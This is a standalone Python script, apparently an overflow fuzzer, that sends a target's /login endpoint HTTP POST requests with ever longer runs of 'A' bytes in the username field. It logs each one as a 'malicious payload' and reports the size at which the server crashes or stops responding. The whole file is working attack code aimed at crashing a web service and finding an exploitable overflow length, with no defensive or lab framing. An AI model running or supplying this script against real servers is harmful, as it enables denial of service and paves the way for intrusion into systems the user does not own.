#!/usr/bin/env python3
import socket, sys, time
from colorama import Fore, Style, init

def exploit():
    i = 200
    server = sys.argv[1]
    port = 80
    init()  # Initialize colorama

    while i <= 1000:
        try:
            buffer = b'A' * i
            payload = buffer
            content = b"username=" + payload + b"&password=A"
            buffer = b"POST /login HTTP/1.1\r\n"
            buffer += b"Host: " + server.encode() + b"\r\n"
            buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
            buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
            buffer += b"\r\n"
            buffer += content

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server, port))
                s.send(buffer)
                response = s.recv(1024)  # Attempt to read server response
                print(Fore.GREEN + f"[*] Malicious payload sent with buffer size: {i}, received response: {response}" + Style.RESET_ALL)
            time.sleep(20)  # Delay of 20 seconds
        except Exception as e:
            print(Fore.RED + f"[!] Connection failed or server crashed at buffer size: {i}" + Style.RESET_ALL)
            print(e)
            break
        i += 100

if __name__ == '__main__':
    exploit()
